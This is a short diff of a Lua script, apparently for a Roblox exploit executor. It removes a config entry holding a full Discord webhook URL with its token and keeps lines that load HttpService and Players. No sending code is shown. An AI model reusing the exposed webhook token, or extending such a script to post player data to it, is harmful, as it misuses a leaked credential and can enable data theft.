@@ -1,6 +1,4 @@
-getgenv().Config = {
-    ["Link Wh"] = "https://discord.com/api/webhooks/1405558686851661904/pVN_OAiLBZ-fhSNWh84OIfN9KchmyuEeyv_kDNUM69xAe53lpGB0j74gPR38gkcWjMsT"
-}
+
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
